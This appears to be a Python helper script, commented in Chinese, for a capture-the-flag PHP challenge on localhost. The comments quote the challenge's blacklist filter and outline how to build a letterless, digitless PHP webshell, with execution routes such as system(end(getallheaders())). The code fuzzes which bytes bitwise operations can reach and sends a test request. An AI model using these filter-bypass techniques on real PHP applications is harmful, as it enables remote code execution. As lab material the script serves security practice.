#coding=utf8

import requests

url="http://localhost:8001/index.php?num={}"

'''
在参数num中以下正则式过滤：
$blacklist = ['[a-z]', '[\x7f-\xff]', '\s',"'", '"', '`', '\[', '\]','\$', '_', '\\\\','\^', ','];
查阅资料得到关键词：“不使用【字母】【数字】【下划线】写shell”
思路大致有三：
1. 异或
2. 取反
3. 递增
对于不使用$写shell，则使用到<?=``?>与<?php echo ``;?>等价的特性。
本题：
1. 过滤反引号：<?=``?>否掉
2. 过滤^，无法亦或

但是可以通过1/0获得字符串INF，通过0/0获得NAN，所以我们现在可以利用的字符集包括INF1234567890，可以进行位运算|、&。
'''

'''
另，根据官方WP
((1.1).(1)){1} = "."
((-1).(1)){0} = "-"
((10000000000000000000).(1)){3} = "E"
((10000000000000000000).(1)){4} = "+"

执行shell的可能性：
1. system(end(getallheaders()))
2. system(file_get_contents("php://input"))
3. 构造文件调用
...
'''

'''
字符集包括INFNA.+E-1234567890，可以进行位运算|、&。
'''
def fuzz():
    print("fuzzing...")
    table = list(b"INFA1234567890")
    d = {}
    length = len(table)
    counter = 0
    while counter != length:
        for i in range(counter,length):
            if ~table[i] & 0xff not in table:
                table.append(~table[i] & 0xff)
                d[~table[i] & 0xff] = {"op": "~", "c": table[i]}
        for i in range(length):
            for j in range(max(i+1,counter),length):
                t = table[i] & table[j]
                if t not in table:
                    table.append(t)
                    d[t] = {"op": "&", "c1": table[i], "c2": table[j]}
                t = table[i] | table[j]
                if t not in table:
                    table.append(t)
                    d[t] = {"op": "|", "c1": table[i], "c2": table[j]}
        counter = length
        length = len(table)
    table.sort()
    print(bytes(table))
    

fuzz()


num = "1/0"

response = requests.get(url.format(num))
print(response.text)